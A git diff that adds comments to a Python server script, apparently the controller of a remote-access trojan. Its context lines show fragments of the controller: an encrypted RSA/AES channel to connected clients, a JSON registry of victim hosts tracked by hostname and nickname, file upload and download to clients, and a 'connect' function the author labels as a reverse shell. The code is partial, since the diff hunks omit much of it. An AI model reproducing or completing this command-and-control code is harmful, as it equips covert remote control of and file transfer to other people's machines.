@@ -111,6 +111,7 @@ class colour:
 ################                        Encrytion                        ##########################
 ###################################################################################################
 
+## first function generate random AES key and send with rsa, other 2 use key for encrypt and decrypt
 def key_generator(client):
     rsa_pub = rsa.PublicKey.load_pkcs1(client.recv(4096),"PEM")
     aes_key = get_random_bytes(AES.block_size)
@@ -138,6 +139,7 @@ def decrypt_data(encrypted_data,aes_key):
 ################                      send/recv                          ##########################
 ###################################################################################################
 
+### 80-90% of code, i use resv and send commands for socket connectins because of dont write encryptin and decryption one by one
 def resv(client,key):
     try:
         return decrypt_data(client.recv(409632),bytes.fromhex(key)).decode()
@@ -158,6 +160,7 @@ def send(client,enc,key):
 ################                          Help                           ##########################
 ###################################################################################################
 
+### want to create special help for each command but not have enought time.
 def help(command):
     match command:
         case "help":
@@ -168,7 +171,7 @@ def help(command):
 ################                         History                         ##########################
 ###################################################################################################
 
-
+### save server and each clients command history
 def history(command):
     try:
         f = time.localtime()
@@ -190,7 +193,7 @@ def log(command,nick):
 ################                       Connections                       ##########################
 ###################################################################################################
 
-
+### this function create and run 3 threads, one for main connection, other checking for status and last one for update json data each second.
 def connections():
     try:
         server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -229,6 +232,7 @@ def connections():
 ################                     Main connection                     ##########################
 ###################################################################################################
 
+### this code run if client status is true or client connect first time (not in client_list file) and each time use thicket_checker for check user data
 def client_connected(server):
     while Data.data_collection:
         try:
@@ -244,6 +248,8 @@ def client_connected(server):
             pass
 
 
+### this function check for user hostname if its in list or not, if its in just take ip port and AES key for uptade list because they are changeable each connection
+### if its not then take default informations and append list.
 def ticket_checker(client,address,key):
     HostName = resv(client,key)
     if data_check("HostName",HostName):
@@ -274,7 +280,7 @@ def ticket_checker(client,address,key):
 ################                     Test connection                     ##########################
 ###################################################################################################
 
-
+### this function send client status each time it ask.
 def test_connect(server):
     while Data.data_collection:
         try:
@@ -295,6 +301,7 @@ def test_connect(server):
 ################                          Data                           ##########################
 ###################################################################################################
 
+### this 4 functions work for read, write data from json file and take each client's informations
 def data_read():
     while Data.data_collection:
         try:
@@ -333,7 +340,7 @@ def data_take(type,name):
 ################                         FTP                             ##########################
 ###################################################################################################
 
-
+### ftp function for download and update file from server to client (its not use resv and send functions, thats why encryption added specialy) 
 def ftp(command,client,key):
     tip = command[1]
     file = command[2]
@@ -379,7 +386,7 @@ def ftp(command,client,key):
 ################                      Commands                           ##########################
 ###################################################################################################
 
-
+### function for revShell
 def connect(NickName):
     if data_check("NickName",NickName):
         user=data_take("NickName",NickName)
@@ -421,7 +428,7 @@ def connect(NickName):
                     data_update("NickName",NickName,{"Status":"False"})
                     print(f"{colour.FG_GREEN}[*] {NickName}'s Status Changed as: False.{colour.FG_RED}\n[*] Client droped !!!{colour.BG_RED}")
 
-
+### function for list data
 def lists():
     try:
         data_header = Data.data_cred[:-1]
@@ -431,7 +438,7 @@ def lists():
         print(f"{colour.FG_RED}[*] Empty List!!!{colour.BG_RED}")
         print(e.with_traceback())
 
-
+### function for start client
 def start(NickName):
 
     if data_check('NickName',NickName):
@@ -440,7 +447,7 @@ def start(NickName):
     else :
         print(f"{colour.FG_RED}[*] NickName not found !!!{colour.END}")
 
-
+### function for stop client
 def stop(NickName):
 
     if data_check('NickName',NickName):
@@ -456,11 +463,14 @@ def stop(NickName):
                 Data.client_list.remove(client)
     else :
         print("[*] NickName not found.")
+
+### function for horse guy 
 def at():
     print(f"""{colour.FG_GREEN}+====================================================+
 |49 6C 6B 69 6E  79 61 78 63 69  6F 67 6C 61 6E 64 69|
 +====================================================+{colour.END}""")
 
+### function for update nickname
 def nick(HostName,NickName):
     if data_check('HostName',HostName):
         data_update('HostName',HostName,{"NickName":NickName})
@@ -468,6 +478,7 @@ def nick(HostName,NickName):
     else :
         print(f"{colour.FG_RED}[*] HostName not found !!!{colour.END}")
 
+### function for close server
 def close():
     for user in Data.json_data['client_list']:
         user["Status"] = "False"
@@ -480,6 +491,7 @@ def close():
     with open('./Data/client_list.json', 'w') as f:
         json.dump(Data.json_data, f,indent=4)
 
+### function for read history files
 def history_read(command):
     if len(command) == 1:
         with open("./Data/history.txt",'r') as f:
@@ -497,7 +509,7 @@ def history_read(command):
 ###################################################################################################
 
 
-
+### main funcktion, starts of party
 if __name__ == "__main__":
 
     connections()
